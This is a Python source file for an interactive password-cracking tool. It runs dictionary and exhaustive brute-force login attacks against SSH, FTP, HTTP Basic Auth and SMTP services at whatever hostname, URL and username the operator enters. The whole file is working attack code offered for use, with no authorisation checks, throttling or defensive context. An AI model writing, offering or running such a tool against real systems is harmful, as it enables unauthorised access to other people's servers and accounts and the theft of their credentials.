import paramiko
import ftplib
from itertools import product
import string
import sys
import requests
from smtplib import SMTP

class PasswordCracker:
    def __init__(self):
        print("Password Cracker Initialized")

    def ssh_brute_force(self, hostname, username, password_list):
        """Perform brute force attack on SSH."""
        print(f"Starting SSH brute force attack on {hostname} with username {username}")
        for password in password_list:
            password = password.strip()
            try:
                ssh = paramiko.SSHClient()
                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                ssh.connect(hostname, username=username, password=password, timeout=3)
                print(f"[SUCCESS] Password found: {password}")
                ssh.close()
                return password
            except paramiko.AuthenticationException:
                print(f"[FAILED] Password: {password}")
            except Exception as e:
                print(f"[ERROR] {e}")
        print("SSH brute force attack completed. Password not found.")
        return None

    def ftp_brute_force(self, hostname, username, password_list):
        """Perform brute force attack on FTP."""
        print(f"Starting FTP brute force attack on {hostname} with username {username}")
        for password in password_list:
            password = password.strip()
            try:
                ftp = ftplib.FTP(hostname)
                ftp.login(user=username, passwd=password)
                print(f"[SUCCESS] Password found: {password}")
                ftp.quit()
                return password
            except ftplib.error_perm:
                print(f"[FAILED] Password: {password}")
            except Exception as e:
                print(f"[ERROR] {e}")
        print("FTP brute force attack completed. Password not found.")
        return None

    def http_brute_force(self, url, username, password_list):
        """Perform brute force attack on HTTP Basic Auth."""
        print(f"Starting HTTP brute force attack on {url} with username {username}")
        for password in password_list:
            password = password.strip()
            try:
                response = requests.get(url, auth=(username, password))
                if response.status_code == 200:
                    print(f"[SUCCESS] Password found: {password}")
                    return password
                else:
                    print(f"[FAILED] Password: {password}")
            except Exception as e:
                print(f"[ERROR] {e}")
        print("HTTP brute force attack completed. Password not found.")
        return None

    def smtp_brute_force(self, server, port, username, password_list):
        """Perform brute force attack on SMTP."""
        print(f"Starting SMTP brute force attack on {server}:{port} with username {username}")
        for password in password_list:
            password = password.strip()
            try:
                with SMTP(server, port) as smtp:
                    smtp.starttls()
                    smtp.login(username, password)
                    print(f"[SUCCESS] Password found: {password}")
                    return password
            except Exception as e:
                print(f"[FAILED] Password: {password}")
        print("SMTP brute force attack completed. Password not found.")
        return None

    def generate_passwords(self, length):
        """Generate passwords for brute force attack."""
        print(f"Generating passwords of length {length}")
        characters = string.ascii_letters + string.digits
        for password in product(characters, repeat=length):
            yield ''.join(password)

    def dictionary_attack(self, target_function, *args, dictionary_path=None):
        """Perform dictionary attack using a password list."""
        print(f"Starting dictionary attack using file: {dictionary_path}")
        try:
            with open(dictionary_path, 'r') as file:
                passwords = file.readlines()
            return target_function(*args, passwords)
        except FileNotFoundError:
            print(f"[ERROR] Dictionary file not found: {dictionary_path}")
            return None

    def brute_force_attack(self, target_function, *args, max_length=4):
        """Perform brute force attack up to a maximum password length."""
        print(f"Starting brute force attack up to length {max_length}")
        for length in range(1, max_length + 1):
            for password in self.generate_passwords(length):
                result = target_function(*args, [password])
                if result:
                    return result
        print("Brute force attack completed. Password not found.")
        return None


if __name__ == "__main__":
    cracker = PasswordCracker()

    # Menu
    print("Password Cracker Tool")
    print("1. SSH Dictionary Attack")
    print("2. FTP Dictionary Attack")
    print("3. HTTP Dictionary Attack")
    print("4. SMTP Dictionary Attack")
    print("5. SSH Brute Force Attack")
    print("6. FTP Brute Force Attack")
    print("7. HTTP Brute Force Attack")
    print("8. SMTP Brute Force Attack")
    choice = input("Choose an option: ")

    if choice in ["1", "2", "3", "4"]:
        dictionary_path = input("Enter path to dictionary file: ")

    if choice in ["1", "5"]:
        hostname = input("Enter hostname or IP address: ")
        username = input("Enter SSH username: ")
        if choice == "1":
            cracker.dictionary_attack(cracker.ssh_brute_force, hostname, username, dictionary_path=dictionary_path)
        elif choice == "5":
            max_length = int(input("Enter maximum password length: "))
            cracker.brute_force_attack(cracker.ssh_brute_force, hostname, username, max_length=max_length)

    elif choice in ["2", "6"]:
        hostname = input("Enter hostname or IP address: ")
        username = input("Enter FTP username: ")
        if choice == "2":
            cracker.dictionary_attack(cracker.ftp_brute_force, hostname, username, dictionary_path=dictionary_path)
        elif choice == "6":
            max_length = int(input("Enter maximum password length: "))
            cracker.brute_force_attack(cracker.ftp_brute_force, hostname, username, max_length=max_length)

    elif choice in ["3", "7"]:
        url = input("Enter HTTP URL: ")
        username = input("Enter HTTP username: ")
        if choice == "3":
            cracker.dictionary_attack(cracker.http_brute_force, url, username, dictionary_path=dictionary_path)
        elif choice == "7":
            max_length = int(input("Enter maximum password length: "))
            cracker.brute_force_attack(cracker.http_brute_force, url, username, max_length=max_length)

    elif choice in ["4", "8"]:
        server = input("Enter SMTP server: ")
        port = int(input("Enter SMTP port: "))
        username = input("Enter SMTP username: ")
        if choice == "4":
            cracker.dictionary_attack(cracker.smtp_brute_force, server, port, username, dictionary_path=dictionary_path)
        elif choice == "8":
            max_length = int(input("Enter maximum password length: "))
            cracker.brute_force_attack(cracker.smtp_brute_force, server, port, username, max_length=max_length)

    else:
        print("Invalid choice. Exiting.")
